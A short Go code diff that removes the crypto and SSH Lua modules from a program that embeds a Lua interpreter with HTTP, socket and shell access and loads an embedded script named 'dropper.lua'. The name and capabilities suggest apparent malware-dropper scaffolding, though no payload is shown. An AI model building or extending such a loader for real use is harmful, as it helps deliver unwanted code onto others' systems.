@@ -4,8 +4,6 @@ import (
 	"net/http"
 
 	"github.com/cjoudrey/gluahttp"
-	"github.com/cyian-1756/gluacrypto"
-	"github.com/cyian-1756/gluassh"
 	"github.com/nubix-io/gluasocket"
 	"github.com/otm/gluash"
 	lua "github.com/yuin/gopher-lua"
@@ -20,8 +18,6 @@ func main() {
 
 	L.PreloadModule("http", gluahttp.NewHttpModule(&http.Client{}).Loader)
 	gluasocket.Preload(L)
-	gluacrypto.Preload(L)
-	L.PreloadModule("ssh", gluassh.Loader)
 	luajson.Preload(L)
 	L.PreloadModule("sh", gluash.Loader)
 	data, err := Asset("dropper.lua")
